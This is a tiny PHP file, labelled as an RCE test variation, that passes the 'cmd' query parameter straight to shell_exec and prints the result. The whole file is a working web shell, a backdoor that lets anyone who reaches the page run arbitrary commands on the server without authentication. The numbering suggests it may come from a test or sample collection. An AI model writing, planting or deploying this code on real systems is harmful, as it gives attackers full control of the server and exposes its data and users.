<?php
// RCE test variation #1271
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>